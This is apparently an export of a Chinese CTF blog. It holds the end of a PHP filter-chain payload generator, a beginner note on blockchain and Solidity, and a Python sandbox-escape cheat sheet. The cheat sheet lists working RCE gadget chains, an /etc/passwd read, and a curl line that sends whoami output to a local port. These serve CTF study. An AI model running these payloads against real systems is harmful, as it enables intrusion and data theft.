    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943&#x27;</span>,
    <span class="string">&#x27;u&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61&#x27;</span>,
    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB&#x27;</span>,
    <span class="string">&#x27;v&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2&#x27;</span>,
    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;</span>,
    <span class="string">&#x27;w&#x27;</span>: <span class="string">&#x27;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#x27;</span>,
    <span class="string">&#x27;X&#x27;</span>: <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#x27;</span>,
    <span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS&#x27;</span>,
    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361&#x27;</span>,
    <span class="string">&#x27;y&#x27;</span>: <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#x27;</span>,
    <span class="string">&#x27;Z&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#x27;</span>,
    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;</span>,
    <span class="string">&#x27;/&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#x27;</span>,
    <span class="string">&#x27;+&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157&#x27;</span>,
    <span class="string">&#x27;=&#x27;</span>: <span class="string">&#x27;&#x27;</span>
&#125;

<span class="keyword">def</span> <span class="title function_">generate_filter_chain</span>(<span class="params">chain, debug_base64 = <span class="literal">False</span></span>):

    encoded_chain = chain
    <span class="comment"># generate some garbage base64</span>
    filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span>
    filters += <span class="string">&quot;convert.base64-encode|&quot;</span>
    <span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span>
    filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>


    <span class="keyword">for</span> c <span class="keyword">in</span> encoded_chain[::-<span class="number">1</span>]:
        filters += conversions[c] + <span class="string">&quot;|&quot;</span>
        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span>
        filters += <span class="string">&quot;convert.base64-decode|&quot;</span>
        filters += <span class="string">&quot;convert.base64-encode|&quot;</span>
        <span class="comment"># get rid of equal signs</span>
        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>
    <span class="keyword">if</span> <span class="keyword">not</span> debug_base64:
        <span class="comment"># don&#x27;t add the decode while debugging chains</span>
        filters += <span class="string">&quot;convert.base64-decode&quot;</span>

    final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span>
    <span class="keyword">return</span> final_payload

<span class="keyword">def</span> <span class="title function_">main</span>():

    <span class="comment"># Parsing command line arguments</span>
    parser = argparse.ArgumentParser(description=<span class="string">&quot;PHP filter chain generator.&quot;</span>)

    parser.add_argument(<span class="string">&quot;--chain&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Content you want to generate. (you will maybe need to pad with spaces for your payload to work)&quot;</span>, required=<span class="literal">False</span>)
    parser.add_argument(<span class="string">&quot;--rawbase64&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.&quot;</span>, required=<span class="literal">False</span>)
    args = parser.parse_args()
    <span class="keyword">if</span> args.chain <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:
        chain = args.chain.encode(<span class="string">&#x27;utf-8&#x27;</span>)
        base64_value = base64.b64encode(chain).decode(<span class="string">&#x27;utf-8&#x27;</span>).replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)
        chain = generate_filter_chain(base64_value)
        <span class="built_in">print</span>(<span class="string">&quot;[+] The following gadget chain will generate the following code : &#123;&#125; (base64 value: &#123;&#125;)&quot;</span>.<span class="built_in">format</span>(args.chain, base64_value))
        <span class="built_in">print</span>(chain)
    <span class="keyword">if</span> args.rawbase64 <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:
        rawbase64 = args.rawbase64.replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)
        <span class="keyword">match</span> = re.search(<span class="string">&quot;^([A-Za-z0-9+/])*$&quot;</span>, rawbase64)
        <span class="keyword">if</span> (<span class="keyword">match</span>):
            chain = generate_filter_chain(rawbase64, <span class="literal">True</span>)
            <span class="built_in">print</span>(chain)
        <span class="keyword">else</span>:
            <span class="built_in">print</span> (<span class="string">&quot;[-] Base64 string required.&quot;</span>)
            exit(<span class="number">1</span>)

<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
    main()
    
链接：https://err0r233.github.io/posts/<span class="number">28510.</span>html</code></pre>
<ul>
<li>
<p>UTF-8 -&gt;UTF-7</p>
<p>测试代码</p>
</li>
</ul>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>

<span class="variable">$a</span>=<span class="string">&#x27;php://filter/convert.iconv.utf-8.utf-7/resource=Qftm.txt&#x27;</span>;
<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;=&#x27;</span>);

<span class="comment">/**</span>
<span class="comment">Qftm.txt 写入的内容为: +AD0-</span>
<span class="comment">**/</span></code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250328104911141.png" alt="image-20250328104911141"></p>
<p>这里直接给某个师傅博客的截图，这是原链接<a href="https://www.anquanke.com/post/id/202510#h3-15">探索php://filter在实战当中的奇技淫巧-安全KER - 安全资讯平台</a>，懒得打了(瘫)</p>
<h3 id><a class="markdownIt-Anchor" href="#"></a> </h3>
]]></content>
      <tags>
        <tag>-CTF -Web</tag>
      </tags>
  </entry>
  <entry>
    <title>智能合约深度学习（已搁置）</title>
    <url>/2024/12/22/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%B7%B2%E6%90%81%E7%BD%AE%EF%BC%89/</url>
    <content><![CDATA[<blockquote>
<h1 id="智能合约深度学习"><a class="markdownIt-Anchor" href="#智能合约深度学习"></a> 智能合约深度学习</h1>
</blockquote>
<h1 id="前序"><a class="markdownIt-Anchor" href="#前序"></a> 前序</h1>
<blockquote>
<p><strong>如果想直接入手合约，可以直接跳至合约开发模块哦</strong></p>
</blockquote>
<p>在进入智能合约学习环节之前，让我们先了解一下它的“爹”，即<strong>区块链</strong></p>
<p>区块链，是一种区中心化，点对点系统的工具，也可以说是一种数据库系统（实际上就是一本记录各种交易的账本）</p>
<p>区别于传统的中心化系统，这个系统由各个区块（前区块的加密哈希，时间戳，交易数据）组成，在这个系统中，由网络中的大多数节点来决定新区块中交易记录的录入以及修改。这就使得其安全性远远超过了传统的系统。假设一个用户想要伪造一份交易，那么从理论来说他需要修改全网每个节点的总账，这个过程需要消耗巨量的算力<s>有这算力谁还来伪造交易啊</s>，每增加一个区块，需要全网51%以上的节点的认可才能够组成区块链</p>
<p>那么我们现在更具体一点，来谈一个家喻户晓的区块链系统———比特币系统</p>
<h1 id="关于比特币系统"><a class="markdownIt-Anchor" href="#关于比特币系统"></a> 关于比特币系统</h1>
<h2 id="竞争记账"><a class="markdownIt-Anchor" href="#竞争记账"></a> 竞争记账</h2>
<p>即挖矿，在一个区块建立之后，竞争记账的节点需要计算建立以来所有交易的哈希值（<strong>SHA256</strong>），再将其两两组合，不断重复，最终得到一个SHA256值（也叫<strong>默克根</strong>），最后需要进行以下计算</p>
<pre><code class="highlight plaintext">SHA256(默克根+前一区的ID+一个随机数)</code></pre>
<p>通常这个值要满足哈希值的前20位为0(达成概率在百万分之一水平),也就是算力比拼</p>
<p>成功者向全网发送通知，若经过检验大家就公认他构造的这个区块并以其作为父区块，进行下一个区块的算力竞争（每10分钟进行一次）</p>
<p>成功者会获得12.5个比特币~~122w美刀(2024.12.9日汇率)~~作为奖励，这就是中本聪设计的激励机制<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/e23cc007503b1060aa2f3f307de43b14.png" alt="img"></p>
<h2 id="长链与短链"><a class="markdownIt-Anchor" href="#长链与短链"></a> 长链与短链</h2>
<p>又是算力竞争…在向全网通知时（假设你的答案正确），可能会有人与你在相同的时间发送了正确的答案，于是会出现两条链，那么就又到了拼算力的时候了，不同的矿工会选择不同的链继续下一轮区块计算，这里就不得不提另一种机制了，即<strong>总是选择工作量最大的链</strong>，于是哪条链先出现下一个区块，也就意味着会有更多的矿工选择这条链工作，那么另一条短链就会被废止。组装短链的矿工也得不到比特币奖励，结果就是区块链只有唯一一条主线。</p>
<h2 id="比特币的交易"><a class="markdownIt-Anchor" href="#比特币的交易"></a> 比特币的交易</h2>
<p>交易包括两个方向，Input以及Output.</p>
<p>两者可以不完全一致，但只能输入略大于输出，那么缺少的这部分去哪里了呢 ，是支付给了矿工哦，每笔交易在发布后可以选择支付交易费用，钱到位交易也会更快被打包。但是不代表不支付或支付很少交易费用不会有人处理你的交易，只是会被推迟，总之，不管是否支付交易费用，矿工都会获得比特币的奖励，你可以将其理解为：<strong>即使你不付给服务员小费，但并不影响他获得工资</strong>。</p>
<h2 id="比特币的交易加密"><a class="markdownIt-Anchor" href="#比特币的交易加密"></a> 比特币的交易加密</h2>
<p>对于每个用户的钱包，都由三部分组成</p>
<p><strong>16位的地址，公钥，私钥(256位)</strong></p>
<p>假设在A与B交易，A发送给B一条A的私钥加密过的内容，那么若B没有A的公钥，B就无法解密内容</p>
<p>公钥的产生依赖于私钥，而钱包的地址生成依赖于公钥</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/65e01b2554c3850eeeebb60eb7c4b93b.jpeg" alt="img"></p>
<p>贴一条其他师傅的说明过程。</p>
<p>第一步：生成随机私钥</p>
<p>私钥是一个随机数，随机选取一个32字节的数，这个数的范围大小是介于1 ~ 0xFFFF FFFF FFFF FFFF FFFF FFFF FFFF FFFE BAAE DCE6 AF48 A03B BFD2 5E8C D036 4141之间的一个数，为了方便后面的计算，我们随机生成一个合法的私钥：</p>
<p>8F72F6B29E6E225A36B68DFE333C7CE5E55D83249D3D2CD6332671FA445C4DD3</p>
<p>第二步：椭圆曲线算公钥</p>
<p>生成了私钥之后，我们使用椭圆曲线加密算法（ECDSA-secp256k1）计算私钥所对应的非压缩公钥，生成的公钥共65字节， 其中一个字节是0x04，其中32个字节是X坐标，另外32个字节是Y坐标：</p>
<p>公钥P.X：<br>
06CCAE7536386DA2C5ADD428B099C7658814CA837F94FADE365D0EC6B1519385</p>
<p>公钥P.Y：<br>
FF83EC5F2C0C8F016A32134589F7B9E97ACBFEFD2EF12A91FA622B38A1449EEB</p>
<p>第三步：计算公钥的SHA-256哈希值</p>
<p>将上述公钥地址拼合，得到标准地址：<br>
0406CCAE7536386DA2C5ADD428B099C7658814CA837F94FADE365D0EC6B1519385FF83EC5F2C0C8F016A32134589F7B9E97ACBFEFD2EF12A91FA622B38A1449EEB</p>
<p>对齐进行SHA-256哈希计算，得到结果：<br>
2572e5f4a8e77ddf5bb35b9e61c61f66455a4a24bcfd6cb190a8e8ff48fc097d</p>
<p>第四步：计算 RIPEMD-160哈希值</p>
<p>取上一步结果，进行RIPEMD-160计算，得到结果：</p>
<p>0b14f003d63ab31aef5fedde2b504699547dd1f6</p>
<p>第五步：加入地址版本号（比特币主网版本号“0x00”）</p>
<p>取上一步结果，在前面加上16进制的00，即：</p>
<p>000b14f003d63ab31aef5fedde2b504699547dd1f6</p>
<p>第六步：计算 SHA-256 哈希值</p>
<p>取上一步结果，进行SHA-256计算，可得：</p>
<p>ddc2270f93cc84cc6869dd373f3c340bbf5cb9a8f5559297cc9e5d947aab2536</p>
<p>然后，对以上结果再次计算 SHA-256 哈希值，得到：</p>
<p>869ac57b83ccf75ca9da8895823562fffb611e3c297d9c2d4612aeeb32850078</p>
<p>第七步：取上一步结果的前4个字节（8位十六进制）</p>
<p>869ac57b</p>
<p>第八步：把这4个字节加在第五步的结果后面</p>
<p>作为校验位，将这4个字节加载第五步的结果后面，这就是比特币地址的16进制形态了：</p>
<p>869ac57b000b14f003d63ab31aef5fedde2b504699547dd1f6</p>
<p>第九步：用Base58编码变换一下地址</p>
<p>对上一步的结果进行Base58编码，得到：</p>
<p>1QCXRuoxWo5Bya9NxHaVBArBQYhatHJrU7</p>
<p>这就是我们经常看到的传统意义上的比特币钱包地址</p>
<h1 id="智能合约开发"><a class="markdownIt-Anchor" href="#智能合约开发"></a> 智能合约开发</h1>
<p>智能合约的开发，主要使用Solidity编译语言以及在线的Remix编译器</p>
<h2 id="数据类型"><a class="markdownIt-Anchor" href="#数据类型"></a> 数据类型</h2>
<h3 id="整数"><a class="markdownIt-Anchor" href="#整数"></a> 整数</h3>
<p>有符号整数类型包括int8、int16、int32、int64等，而无符号整数类型包括uint8、uint16、uint32、uint64等。这些类型表示不同位数的整数。</p>
<p>相较于C语言，保留了大部分运算，增加了乘方(**)运算以及更改了&quot;&lt;&lt;“”&gt;&gt;&quot;的运算规则</p>
<pre><code class="highlight plaintext">x&lt;&lt;y  相当于x*2**y   x&gt;&gt;y相当于x/2**y</code></pre>
<h3 id="逻辑"><a class="markdownIt-Anchor" href="#逻辑"></a> 逻辑</h3>
<p>即bool类型，会在内置函数中大量出现，默认值为false</p>
<h3 id="地址"><a class="markdownIt-Anchor" href="#地址"></a> 地址</h3>
<p>用<strong>address</strong>来声明，长度为20位，表示以太坊网络上的账户地址</p>
<p>在地址型下有**transfer(转账)<strong>与</strong>balance(账户)**两个变量</p>
<p>通过以下函数来处理地址类型（关于Gas的概念，请见<strong>交易处理</strong>板块）</p>
<pre><code class="highlight plaintext">&lt;address&gt;.balance(uint 256) ——&gt;返回以wei为单位的该地址的以太币账户（1ETH=10^18wei）</code></pre>
<pre><code class="highlight plaintext">&lt;address&gt;.transfer(uint 256 amount) ——&gt; 给某地址转入指定数量的以太币（每次转账需要2300的Gas费用，且费用固定）</code></pre>
<p>余额不足，Gas不足时会使合约无法执行，回滚已执行的程序并且发送异常信息（<strong>交易被终止</strong>）</p>
<pre><code class="highlight plaintext">&lt;address&gt;.send(uint 256 amount) returns (bool) ——&gt; 给某地址转入指定数量的以太币（每次转账需要2300的Gas费用，且费用固定）在交易成功或失败后会返回对应的bool值</code></pre>
<p>余额不足，Gas不足时会终止程序但不会发送异常消息，会返回False</p>
<p>但使用.send是存在一定风险的，可能会导致转账失败(调用的堆栈&gt;1024KB或发出方的Gas耗尽)的情况下交易的对方仍能收到以太币</p>
<pre><code class="highlight plaintext">&lt;address&gt;.call(...) returns (bool) ——&gt;最常用的调用函数，失败返回false,Gas的费用可自己调整。</code></pre>
<p>发布低级别的调用</p>
<p>call()下有两个控制交易的内置函数</p>
<p>gas()(支付的Gas值)与value()(支付的以太币值)，两者同时调用没有先后顺序的要求</p>
<pre><code class="highlight plaintext">例如：address.call.gas(100000).value(1 ether)(&quot;register&quot;,&quot;Myname&quot;)</code></pre>
<pre><code class="highlight plaintext">&lt;address&gt;.callcode(...) returns (bool)</code></pre>
<p>发布低级别的调用，没call好用，不久就会被删除了</p>
<pre><code class="highlight plaintext">&lt;address&gt; .delegatecall(...) returns (bool)</code></pre>
<p>发布低级别的代表调用,调用的是储存在另一个库中的库代码(Library code)</p>
<p>？故使用前要确定两个合约的储存设计都要适用于该函数？</p>
<blockquote>
<p>[!WARNING]</p>
<p><code>call()</code> <code>callcode()</code> <code>delegatecall()</code>都是低阶函数，使用时调用的未知合约可能是恶意合约，在调用是可能会被篡权，反过来被调用合约，因此调用函数返回时要注意原合约的参数是否已经被改变</p>
</blockquote>
<blockquote>
<p>地址常量</p>
</blockquote>
<p>​</p>
<h3 id="字节数组"><a class="markdownIt-Anchor" href="#字节数组"></a> 字节数组</h3>
<p>分为<strong>固定长度的字节数组</strong>以及<strong>可变长度的字节数组</strong></p>
<p>固定长度的数组可以用bytes1~bytes32来说明(bytes1也可以直接记作byte)</p>
<p>可以通过索引访问以及[变量名].length返回字节长度</p>
<p>可变长度的数组：</p>
<p>①bytes(与array性质相同)</p>
<p>②string(可以理解为特殊的数组)，不可以调用.length/索引来访问</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>智能合约</tag>
      </tags>
  </entry>
  <entry>
    <title>沙箱逃逸</title>
    <url>/2025/05/05/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<p>浅浅记一下无处不在的沙箱逃逸</p>
<p>这个东西还是要搭配例题的嗯嗯</p>
<h1 id="沙箱逃逸从入门到放弃"><a class="markdownIt-Anchor" href="#沙箱逃逸从入门到放弃"></a> 沙箱逃逸从入门到放弃</h1>
<h2 id="pyjail"><a class="markdownIt-Anchor" href="#pyjail"></a> <code>Pyjail</code></h2>
<p><code>misc</code>手也能学会<s>必须学会</s>的小技巧</p>
<p>先介绍一些不太常规的再介绍常规的吧(密码的现在沙箱哪里还有常规的。。。)</p>
<p>先看一些进行信息收集的函数，信息收集完成后才好确定逃逸方向</p>
<h3 id="神必小帮手"><a class="markdownIt-Anchor" href="#神必小帮手"></a> 神必小帮手</h3>
<h4 id="dir"><a class="markdownIt-Anchor" href="#dir"></a> dir()</h4>
<pre><code class="highlight plaintext">dir()可以用于查看可用的内置函数</code></pre>
<p>主要是用来找作为利用点的函数</p>
<h4 id="__dict__"><a class="markdownIt-Anchor" href="#__dict__"></a> <code>__dict__</code></h4>
<p>一键查属性</p>
<p><code>m.x</code>等同于<code>m.__dict__[“x”]</code>,我们就可以用一些编码来绕过字符明文检<code>m.x</code>等同于<code>m.__dict__[“x”]</code>,我们就可以用一些编码来绕过字符明文检测</p>
<h4 id="getattr"><a class="markdownIt-Anchor" href="#getattr"></a> <code>getattr()</code></h4>
<p>看看你的属性呢，可以引入模块来执行命令，有种opcode的即视感(雾)</p>
<pre><code class="highlight plaintext">getattr(__import__(&#x27;os&#x27;),&quot;system&quot;)(&#x27;whoami&#x27;)</code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250703102411030.png" alt="image-20250703102411030"></p>
<h4 id="__getattribute__"><a class="markdownIt-Anchor" href="#__getattribute__"></a> <code>__getattribute__</code></h4>
<p>对象的内置方法，用于在访问对象的任意对象时自动调用</p>
<p>这是一个低级别的钩子，用于拦截属性访问，可以对其进行<code>重载</code>以<code>自定义属性访问行为</code>。</p>
<pre><code class="highlight plaintext">在调用时，一般都是__getattibute__先被调用，当抛出AttributeError 异常时，__getattr__ 才会被调用。
另外，所有的类都会有__getattribute__属性，而不一定有__getattr__属性</code></pre>
<h4 id="__getitem__"><a class="markdownIt-Anchor" href="#__getitem__"></a> <code>__getitem__</code></h4>
<p><code>__getitem__</code>方法适用于获取元素</p>
<p>当使用<code>obj[key]</code>这样的操作时，python就会自动调用它</p>
<p>这里的key可以是整数索引也可以是其他能当&quot;标签&quot;的键</p>
<p>而你可以用get方法来获得键的值</p>
<h4 id="破壁函数"><a class="markdownIt-Anchor" href="#破壁函数"></a> &quot;破壁&quot;函数</h4>
<pre><code class="highlight plaintext">eval(input())
help()
breakpoint()
sh</code></pre>
<h3 id="妙手回春self-builtins"><a class="markdownIt-Anchor" href="#妙手回春self-builtins"></a> 妙手回春(self builtins)</h3>
<p>有时沙箱中会用<code>exec</code>限制你的命名空间</p>
<p>因为<code>exec</code>的第二个参数是可以自定义的，通过修改，删除命名空间里的函数就达到了限制你操作的效果，例子来源于 iscc_2016_pycalc</p>
<pre><code class="highlight plaintext">def _hook_import_(name, *args, **kwargs):
    module_blacklist = [&#x27;os&#x27;, &#x27;sys&#x27;, &#x27;time&#x27;, &#x27;bdb&#x27;, &#x27;bsddb&#x27;, &#x27;cgi&#x27;,
                        &#x27;CGIHTTPServer&#x27;, &#x27;cgitb&#x27;, &#x27;compileall&#x27;, &#x27;ctypes&#x27;, &#x27;dircache&#x27;,
                        &#x27;doctest&#x27;, &#x27;dumbdbm&#x27;, &#x27;filecmp&#x27;, &#x27;fileinput&#x27;, &#x27;ftplib&#x27;, &#x27;gzip&#x27;,
                        &#x27;getopt&#x27;, &#x27;getpass&#x27;, &#x27;gettext&#x27;, &#x27;httplib&#x27;, &#x27;importlib&#x27;, &#x27;imputil&#x27;,
                        &#x27;linecache&#x27;, &#x27;macpath&#x27;, &#x27;mailbox&#x27;, &#x27;mailcap&#x27;, &#x27;mhlib&#x27;, &#x27;mimetools&#x27;,
                        &#x27;mimetypes&#x27;, &#x27;modulefinder&#x27;, &#x27;multiprocessing&#x27;, &#x27;netrc&#x27;, &#x27;new&#x27;,
                        &#x27;optparse&#x27;, &#x27;pdb&#x27;, &#x27;pipes&#x27;, &#x27;pkgutil&#x27;, &#x27;platform&#x27;, &#x27;popen2&#x27;, &#x27;poplib&#x27;,
                        &#x27;posix&#x27;, &#x27;posixfile&#x27;, &#x27;profile&#x27;, &#x27;pstats&#x27;, &#x27;pty&#x27;, &#x27;py_compile&#x27;,
                        &#x27;pyclbr&#x27;, &#x27;pydoc&#x27;, &#x27;rexec&#x27;, &#x27;runpy&#x27;, &#x27;shlex&#x27;, &#x27;shutil&#x27;, &#x27;SimpleHTTPServer&#x27;,
                        &#x27;SimpleXMLRPCServer&#x27;, &#x27;site&#x27;, &#x27;smtpd&#x27;, &#x27;socket&#x27;, &#x27;SocketServer&#x27;,
                        &#x27;subprocess&#x27;, &#x27;sysconfig&#x27;, &#x27;tabnanny&#x27;, &#x27;tarfile&#x27;, &#x27;telnetlib&#x27;,
                        &#x27;tempfile&#x27;, &#x27;Tix&#x27;, &#x27;trace&#x27;, &#x27;turtle&#x27;, &#x27;urllib&#x27;, &#x27;urllib2&#x27;,
                        &#x27;user&#x27;, &#x27;uu&#x27;, &#x27;webbrowser&#x27;, &#x27;whichdb&#x27;, &#x27;zipfile&#x27;, &#x27;zipimport&#x27;]
    for forbid in module_blacklist:
        if name == forbid:        # don&#x27;t let user import these modules
            raise RuntimeError(&#x27;No you can\&#x27; import &#123;0&#125;!!!&#x27;.format(forbid))
    # normal modules can be imported
    return __import__(name, *args, **kwargs)

def sandbox_exec(command):      # sandbox user input
    result = 0
    __sandboxed_builtins__ = dict(__builtins__.__dict__)
    __sandboxed_builtins__[&#x27;__import__&#x27;] = _hook_import_    # hook import
    del __sandboxed_builtins__[&#x27;open&#x27;]
    _global = &#123;
        &#x27;__builtins__&#x27;: __sandboxed_builtins__
    &#125;

    ...
        exec command in _global     # do calculate in a sandboxed  
    ...</code></pre>
<ol>
<li>沙箱首先获取 <code>__builtins__</code>，然后依据现有的 <code>__builtins__</code> 来构建命名空间。</li>
<li>修改 <code>__import__</code> 函数为自定义的<code>_hook_import_</code></li>
<li>删除 open 函数防止文件操作</li>
<li>exec 命令。</li>
</ol>
<p>绕过方式：</p>
<p>由于 exec 运行在特定的命名空间里，可以通过获取其他命名空间里的 <code>__builtins__</code>（这个<code>__builtins__</code>保存的就是原始<code>__builtins__</code>的引用），比如 types 库，来执行任意命令：</p>
<pre><code class="highlight plaintext">__import__(&#x27;types&#x27;).__builtins__
__import__(&#x27;string&#x27;).__builtins__</code></pre>
<h3 id="继承链no-builtins"><a class="markdownIt-Anchor" href="#继承链no-builtins"></a> 继承链(no builtins)</h3>
<p>什么?<code>builtins</code>被清光了?没事我有继承链</p>
<p>poc原理和SSTI相似，就是利用父类和子类之间的继承关系，不断访问内部属性来达到调用，实现文件读取或者RCE的效果</p>
<p><strong>前提是没有把attribute给你禁掉，禁掉之后这种方法就行不通了</strong></p>
<p>没禁掉的情况基本无敌吧大概</p>
<p><strong>RCE</strong></p>
<pre><code class="highlight plaintext"># os
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&quot;system&quot;](&quot;ls&quot;)

# subprocess 
[ x for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__ == &#x27;Popen&#x27;][0](&#x27;ls&#x27;)

# builtins
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_GeneratorContextManagerBase&quot; and &quot;os&quot; in x.__init__.__globals__ ][0][&quot;__builtins__&quot;]

# help
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_GeneratorContextManagerBase&quot; and &quot;os&quot; in x.__init__.__globals__ ][0][&quot;__builtins__&quot;][&#x27;help&#x27;]

[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&#x27;__builtins__&#x27;]

#sys
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;sys&quot; in x.__init__.__globals__ ][0][&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)

[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;&#x27;_sitebuiltins.&quot; in str(x) and not &quot;_Helper&quot; in str(x) ][0][&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)

#commands (not very common)
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;commands&quot; in x.__init__.__globals__ ][0][&quot;commands&quot;].getoutput(&quot;ls&quot;)

#pty (not very common)
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;pty&quot; in x.__init__.__globals__ ][0][&quot;pty&quot;].spawn(&quot;ls&quot;)

#importlib
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;importlib&quot; in x.__init__.__globals__ ][0][&quot;importlib&quot;].import_module(&quot;os&quot;).system(&quot;ls&quot;)
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;importlib&quot; in x.__init__.__globals__ ][0][&quot;importlib&quot;].__import__(&quot;os&quot;).system(&quot;ls&quot;)

#imp
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;&#x27;imp.&quot; in str(x) ][0][&quot;importlib&quot;].import_module(&quot;os&quot;).system(&quot;ls&quot;)
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;&#x27;imp.&quot; in str(x) ][0][&quot;importlib&quot;].__import__(&quot;os&quot;).system(&quot;ls&quot;)

#pdb
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;pdb&quot; in x.__init__.__globals__ ][0][&quot;pdb&quot;].os.system(&quot;ls&quot;)

# ctypes
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;builtins&quot; in x.__init__.__globals__ ][0][&quot;builtins&quot;].__import__(&#x27;ctypes&#x27;).CDLL(None).system(&#x27;ls /&#x27;.encode())

# multiprocessing
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;builtins&quot; in x.__init__.__globals__ ][0][&quot;builtins&quot;].__import__(&#x27;multiprocessing&#x27;).Process(target=lambda: __import__(&#x27;os&#x27;).system(&#x27;curl localhost:9999/?a=`whoami`&#x27;)).start()</code></pre>
<p><strong>File</strong></p>
<pre><code class="highlight plaintext">[ x for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;FileLoader&quot; ][0].get_data(0,&quot;/etc/passwd&quot;)</code></pre>
<h3 id="栈帧逃逸"><a class="markdownIt-Anchor" href="#栈帧逃逸"></a> 栈帧逃逸</h3>
<p>先了解一些概念吧。</p>
<p><strong>栈帧</strong></p>
<p><strong>生成器</strong></p>
<p>生成器（Generator）是 Python 中一种特殊的迭代器，它可以通过简单的函数和表达式来创建。生成器的主要特点是能够逐个产生值，并且在每次生成值后保留当前的状态，以便下次调用时可以继续生成值。这使得生成器非常适合处理大型数据集或需要延迟计算的情况。</p>
